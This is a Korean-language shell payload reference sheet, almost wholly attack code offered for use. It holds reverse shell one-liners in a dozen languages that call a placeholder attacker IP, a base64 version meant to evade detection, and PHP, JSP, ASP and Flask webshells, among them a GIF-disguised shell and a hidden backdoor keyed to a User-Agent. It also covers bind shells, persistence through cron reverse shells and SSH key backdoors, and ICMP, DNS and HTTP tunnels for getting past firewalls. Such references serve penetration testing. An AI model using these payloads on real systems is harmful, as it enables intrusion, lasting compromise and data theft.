# 쉘 페이로드 모음집

리버스 쉘, 웹쉘, 바인드 쉘 등 다양한 쉘 페이로드 정리

## 목차
1. [Reverse Shell 페이로드](#reverse-shell-페이로드)
2. [웹쉘 (WebShell)](#웹였-webshell)
3. [바인드 쉘 (Bind Shell)](#바인드-쉘-bind-shell)
4. [쉘 안정화 (Shell Stabilization)](#쉘-안정화-shell-stabilization)
5. [쉘 유지 및 복구](#쉘-유지-및-복구)

---

## Reverse Shell 페이로드

### 설정
```bash
# 공격자 서버에서 리스너 시작
nc -lvnp 4444
# 또는
nc -lvnp 4444 -s 공격자IP
```

### 1. Bash

**기본 (가장 흔함)**
```bash
bash -i >& /dev/tcp/공격자IP/4444 0>&1
```

**URL 인코딩 (웹쉘용)**
```bash
bash -c "bash -i >& /dev/tcp/공격자IP/4444 0>&1"
```

**Base64 인코딩 (탐지 우회)**
```bash
# 페이로드 생성
echo 'bash -i >& /dev/tcp/공격자IP/4444 0>&1' | base64
# 실행
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xLzQ0NDQgMD4mMQo=' | base64 -d | bash
```

**백그라운드 실행**
```bash
bash -c "bash -i >& /dev/tcp/공격자IP/4444 0>&1 &"
```

### 2. Python

**Python 2**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("공격자IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

**Python 3**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("공격자IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Python PTY (더 안정적)**
```python
python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("공격자IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

**짧은 버전**
```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("공격자IP",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'
```

### 3. Netcat

**nc -e 사용 가능 시**
```bash
nc -e /bin/bash 공격자IP 4444
```

**nc -e 없을 때 (방법 1)**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 공격자IP 4444 >/tmp/f
```

**nc -e 없을 때 (방법 2)**
```bash
mknod /tmp/backpipe p; /bin/bash 0</tmp/backpipe | nc 공격자IP 4444 1>/tmp/backpipe
```

**Ncat (Nmap의 nc)**
```bash
ncat 공격자IP 4444 -e /bin/bash
ncat --udp 공격자IP 4444 -e /bin/bash  # UDP
ncat --ssl 공격자IP 4444 -e /bin/bash  # SSL
```

### 4. Perl

**방법 1**
```perl
perl -e 'use Socket;$i="공격자IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

**방법 2 (Windows 호환)**
```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"공격자IP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### 5. PHP

**방법 1**
```php
php -r '$sock=fsockopen("공격자IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

**방법 2**
```php
php -r '$sock=fsockopen("공격자IP",4444);shell_exec("/bin/bash -i <&3 >&3 2>&3");'
```

**방법 3 (proc_open)**
```php
php -r '$sock=fsockopen("공격자IP",4444);$proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### 6. Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("공격자IP",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

**Windows 호환**
```ruby
ruby -rsocket -e 'c=TCPSocket.new("공격자IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### 7. Socat

**타겟에서 (TCP)**
```bash
socat TCP:공격자IP:4444 EXEC:/bin/bash
```

**타겟에서 (TTY)**
```bash
socat TCP:공격자IP:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

**공격자에서 (리스너)**
```bash
socat -d -d TCP-LISTEN:4444 STDOUT
socat TCP-LISTEN:4444,reuseaddr,fork STDOUT  # 여러 연결
```

**암호화된 쉘 (SSL)**
```bash
# 1. 인증서 생성 (공격자)
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# 2. 리스너 시작 (공격자)
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 STDOUT

# 3. 연결 (타겟)
socat OPENSSL:공격자IP:4444,verify=0 EXEC:/bin/bash
```

### 8. Telnet

```bash
telnet 공격자IP 4444 | /bin/bash | telnet 공격자IP 4445
```

**리스너 (2개 필요)**
```bash
# 터미널 1
nc -lvnp 4444
# 터미널 2
nc -lvnp 4445
```

### 9. Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/공격자IP/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### 10. Node.js

```javascript
require('child_process').exec('bash -i >& /dev/tcp/공격자IP/4444 0>&1');
```

**자세한 버전**
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, "공격자IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
})();
```

### 11. Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/공격자IP/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### 12. Golang

```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","공격자IP:4444");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

---

## 웹쉘 (WebShell)

### PHP 웹쉘

**1. 미니멀 쉘**
```php
<?php system($_GET['cmd']); ?>
```
사용: `http://target.com/shell.php?cmd=whoami`

**2. POST 방식**
```php
<?php system($_POST['cmd']); ?>
```
사용: `curl -d "cmd=whoami" http://target.com/shell.php`

**3. 난독화 버전**
```php
<?php @eval($_POST['x']); ?>
```
사용: `curl -d "x=system('whoami');" http://target.com/shell.php`

**4. 이미지 위장**
```php
GIF89a
<?php system($_GET['c']); ?>
```
파일명: `shell.php.gif` 또는 `shell.gif`

**5. 완전한 기능 (파일 업로드/다운로드)**
```php
<?php
// 명령 실행
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}

// 파일 업로드
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo "Uploaded: " . $_FILES['f']['name'];
}

// 파일 다운로드
if(isset($_GET['dl'])){
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($_GET['dl']).'"');
    readfile($_GET['dl']);
    exit;
}
?>
```

**6. 백도어 쉘 (은밀함)**
```php
<?php
// 특정 User-Agent에만 반응
if(strpos($_SERVER['HTTP_USER_AGENT'], 'CustomUA') !== false) {
    if(isset($_GET['c'])){
        system($_GET['c']);
    }
}
?>
```
사용: `curl -A "CustomUA" "http://target.com/shell.php?c=whoami"`

### JSP 웹쉘

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null){
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while((line = br.readLine()) != null){
            out.println(line);
        }
    }
%>
```

### ASP 웹쉘

```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
Response.Write(getCommandOutput(Request.QueryString("cmd")))
%>
```

### Python 웹쉘 (Flask)

```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/')
def shell():
    cmd = request.args.get('cmd')
    if cmd:
        return os.popen(cmd).read()
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## 바인드 쉘 (Bind Shell)

**타겟 서버가 포트를 열고 대기**

### Netcat

**타겟에서:**
```bash
nc -lvnp 4444 -e /bin/bash
# 또는
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvnp 4444 >/tmp/f
```

**공격자에서:**
```bash
nc 타겟IP 4444
```

### Python

**타겟에서:**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Socat

**타겟에서:**
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**공격자에서:**
```bash
socat - TCP:타겟IP:4444
```

---

## 쉘 안정화 (Shell Stabilization)

### 기본 Reverse Shell → 안정적인 TTY

**방법 1: Python PTY**
```bash
# 1. Python으로 TTY 생성
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Ctrl+Z 눌러서 백그라운드로 전환

# 3. 로컬 터미널 설정
stty raw -echo; fg

# 4. Enter 2번

# 5. 환경 변수 설정
export TERM=xterm
export SHELL=/bin/bash

# 6. 터미널 크기 설정 (선택)
stty rows 38 columns 116
```

**방법 2: Script 명령어**
```bash
script /dev/null -c bash
# 또는
/usr/bin/script -qc /bin/bash /dev/null
```

**방법 3: Socat**
```bash
# 타겟에서 socat 다운로드
wget http://공격자IP/socat -O /tmp/socat
chmod +x /tmp/socat

# 타겟에서 실행
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:공격자IP:4444

# 공격자에서 socat 리스너
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### 쉘 기능 개선

**탭 완성, 화살표 키, Ctrl+C 작동**
```bash
# 1단계
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2단계 (Ctrl+Z)

# 3단계
stty raw -echo; fg

# 4단계 (Enter 2번 후)
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 50 columns 200  # 터미널 크기 조정
```

### 터미널 크기 확인

**로컬에서:**
```bash
stty -a | head -n1 | cut -d ';' -f 2-3
# 출력: rows 38; columns 116
```

**리버스 쉘에서 적용:**
```bash
stty rows 38 columns 116
```

---

## 쉘 유지 및 복구

### 1. Screen/Tmux 세션

**Screen 사용**
```bash
# 세션 생성
screen -S backup

# 세션 나가기 (Ctrl+A, D)

# 다시 연결
screen -r backup
```

**Tmux 사용**
```bash
# 세션 생성
tmux new -s backup

# 세션 나가기 (Ctrl+B, D)

# 다시 연결
tmux attach -t backup
```

### 2. Cron으로 자동 재연결

```bash
# Crontab 편집
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/공격자IP/4444 0>&1'") | crontab -
```

### 3. SSH 백도어

```bash
# 1. SSH 키 생성 (공격자)
ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor

# 2. 공개키를 타겟에 추가
mkdir -p ~/.ssh
echo "공격자_공개키" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 3. 연결
ssh -i ~/.ssh/backdoor user@타겟IP
```

### 4. 여러 Reverse Shell 동시 실행

```bash
# Bash
(bash -i >& /dev/tcp/IP1/4444 0>&1 &)
(bash -i >& /dev/tcp/IP2/4444 0>&1 &)

# Python
python3 -c 'import os; os.system("bash -i >& /dev/tcp/IP1/4444 0>&1 &")'
```

### 5. 데몬으로 실행

```bash
# nohup 사용
nohup bash -c 'while true; do bash -i >& /dev/tcp/공격자IP/4444 0>&1; sleep 10; done' &

# disown 사용
bash -c 'while true; do bash -i >& /dev/tcp/공격자IP/4444 0>&1; sleep 10; done' & disown
```

---

## 방화벽 우회 기법

### 1. ICMP 터널

**타겟에서:**
```bash
# icmpsh 사용
./icmpsh_s.py 타겟IP 공격자IP
```

**공격자에서:**
```bash
sysctl -w net.ipv4.icmp_echo_ignore_all=1
./icmpsh_m.py 공격자IP 타겟IP
```

### 2. DNS 터널

**dnscat2 사용**
```bash
# 공격자 (DNS 서버)
dnscat2-server example.com

# 타겟
./dnscat example.com
```

### 3. HTTP 터널

**타겟에서:**
```bash
while true; do
    cmd=$(curl -s http://공격자IP/cmd.txt)
    $cmd | curl -s -d @- http://공격자IP/output.php
    sleep 2
done
```

### 4. 포트 포워딩

**SSH 터널**
```bash
# 로컬 포트 포워딩
ssh -L 4444:localhost:4444 user@중간서버

# 리버스 포트 포워딩
ssh -R 4444:localhost:4444 user@공격자서버
```

---

## 페이로드 제너레이터

### MSFVenom

**Linux Reverse Shell**
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=공격자IP LPORT=4444 -f elf > shell.elf
```

**Python Reverse Shell**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=공격자IP LPORT=4444 -f raw
```

**PHP Reverse Shell**
```bash
msfvenom -p php/reverse_php LHOST=공격자IP LPORT=4444 -f raw > shell.php
```

### Reverse Shell Generator (온라인)

- https://www.revshells.com/
- https://github.com/swisskyrepo/PayloadsAllTheThings

---

## 빠른 참고

### 가장 안정적인 조합

1. **초기 쉘:** Python3
2. **안정화:** Python PTY + stty
3. **백업:** Cron + SSH 키

```bash
# 1. 초기 쉘 (타겟)
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'

# 2. 안정화 (리버스 쉘 내)
export TERM=xterm; stty raw -echo; fg

# 3. Cron 백도어 (타겟)
(crontab -l; echo "*/5 * * * * bash -i >& /dev/tcp/IP/4444 0>&1")| crontab -
```

### 포트별 우회 확률

| 포트 | 서비스 | 차단 확률 |
|------|--------|----------|
| 4444 | 없음 | 높음 |
| 443 | HTTPS | 낮음 ⭐ |
| 80 | HTTP | 낮음 ⭐ |
| 53 | DNS | 낮음 ⭐ |
| 22 | SSH | 중간 |
| 8080 | HTTP-ALT | 중간 |

**추천:** 443, 80, 53 포트 사용

---

**작성일:** 2025-11-07
**목적:** 쉘 페이로드 레퍼런스
